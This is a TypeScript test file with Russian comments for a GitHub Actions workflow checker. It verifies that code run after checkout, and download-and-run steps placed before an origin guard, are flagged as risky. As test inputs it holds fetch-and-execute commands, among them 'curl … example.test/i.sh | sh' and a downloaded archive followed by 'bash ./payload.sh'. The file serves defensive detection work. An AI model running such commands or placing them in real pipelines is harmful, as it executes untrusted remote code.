import { describe, it, expect } from 'vitest';
import { riskyStepsInJob, type WorkflowJob, type WorkflowStep } from './helpers/workflows';

// Дефект B10 (docs/security-audit-2026-08-08.md): «исполнение выгруженного кода»
// опознавалось по СПИСКУ известных интерпретаторов
// (`npm|npx|yarn|pnpm|astro|vite|tsx|node`). Шаг `bash ./x.sh`, `make` или
// `./bin/foo` под него не подпадал, и проверки происхождения в
// deploy-gating.test.ts остались бы зелёными над реальной уязвимостью.
//
// Проверяется СИНТЕТИЧЕСКИЙ джоб, а не реальный workflow: настоящий build-job
// защищён условием на уровне джоба, поэтому добавленный туда `bash ./x.sh`
// остался бы недостижим для форка и гейт не покраснел бы — красное не доказывало
// бы работу классификатора.

function step(index: number, fields: Partial<WorkflowStep>): WorkflowStep {
  return {
    index,
    raw: JSON.stringify(fields),
    name: fields.name,
    uses: fields.uses,
    run: fields.run,
    if: fields.if,
    with: fields.with,
    env: fields.env,
  } as WorkflowStep;
}

function job(steps: WorkflowStep[]): WorkflowJob {
  return { key: 'build', if: undefined, needs: [], steps } as unknown as WorkflowJob;
}

const CHECKOUT = { uses: 'actions/checkout@v4' };
// Guard узнаётся по предмету: он читает происхождение прогона
// (`workflow_run.head_repository`) и роняет джоб. Только ему позволено выполняться
// до того, как происхождение установлено.
const GUARD = {
  name: 'verify origin',
  env: { HEAD_REPO: '${{ github.event.workflow_run.head_repository.full_name }}' },
  run: 'test "$HEAD_REPO" = "$GITHUB_REPOSITORY" || exit 1',
};

describe('riskyStepsInJob — исполнение после выгрузки кода', () => {
  // Общий признак, а не перечень интерпретаторов: список отстаёт от предмета молча.
  const afterCheckout: Array<[string, string]> = [
    ['bash-скрипт из репозитория', 'bash ./scripts/deploy.sh'],
    ['make', 'make build'],
    ['исполняемый файл из репозитория', './bin/check-openspec-integration'],
    ['загрузка и исполнение', 'curl -sL https://example.test/i.sh | sh'],
  ];

  for (const [label, run] of afterCheckout) {
    it(`после checkout считает исполнением: ${label}`, () => {
      const j = job([step(0, CHECKOUT), step(1, { run })]);
      const risky = riskyStepsInJob(j);
      expect(
        risky.map((s) => s.index),
        `шаг «${run}» после checkout не опознан как исполнение кода`,
      ).toContain(1);
    });
  }

  it('после checkout считает исполнением локальный action (uses: ./…)', () => {
    const j = job([step(0, CHECKOUT), step(1, { uses: './.github/actions/build' })]);
    expect(
      riskyStepsInJob(j).map((s) => s.index),
      'локальный action — это код из checkout’а, он должен считаться исполнением',
    ).toContain(1);
  });

  it('сам шаг выгрузки остаётся в списке', () => {
    const j = job([step(0, CHECKOUT), step(1, { run: 'bash ./x.sh' })]);
    expect(riskyStepsInJob(j).map((s) => s.index)).toContain(0);
  });

  // Связка «скачал и исполнил» ДО checkout. Прежнее правило её не видело: шага
  // выгрузки из известного списка (checkout/download-artifact/git) здесь нет, а
  // перечень интерпретаторов не покрывает ни `curl`, ни `tar`, ни `bash ./payload.sh`.
  // Именно поэтому правило больше не опирается на списки.
  it('скачивание и исполнение ДО checkout считаются опасными', () => {
    const j = job([
      step(0, { name: 'fetch payload', run: 'curl -sL "$ARCHIVE_URL" | tar -xz -C .' }),
      step(1, { run: 'bash ./payload.sh' }),
      step(2, CHECKOUT),
    ]);
    const risky = riskyStepsInJob(j).map((s) => s.index);
    expect(risky, 'скачивание чужого архива до checkout не опознано').toContain(0);
    expect(risky, 'исполнение скачанного до checkout не опознано').toContain(1);
  });

  it('сторонний action до проверки происхождения тоже опасен', () => {
    const j = job([step(0, { uses: 'some/third-party-action@v1' }), step(1, CHECKOUT)]);
    expect(riskyStepsInJob(j).map((s) => s.index)).toContain(0);
  });
});

describe('riskyStepsInJob — сам guard происхождения', () => {
  // Единственное исключение из правила. Без него первым «опасным» станет сам guard,
  // и проверка порядка «происхождение раньше всего остального» стала бы невыполнимой
  // на исправном workflow.
  it('guard происхождения не считается опасным шагом', () => {
    const j = job([step(0, GUARD), step(1, CHECKOUT)]);
    expect(
      riskyStepsInJob(j).map((s) => s.index),
      'guard — единственный шаг, которому позволено идти до установления происхождения',
    ).not.toContain(0);
  });

  // Остальные шаги опасны и после guard: правило про ПОРЯДОК, а не про безвредность
  // отдельной команды. Так исчезает нужда решать, какой `run` считать безобидным, —
  // именно эти решения и порождали слепые пятна.
  it('обычный шаг после guard остаётся в списке, но идёт после него', () => {
    const j = job([step(0, GUARD), step(1, { run: 'echo hello' })]);
    const risky = riskyStepsInJob(j).map((s) => s.index);
    expect(risky).toEqual([1]);
  });
});
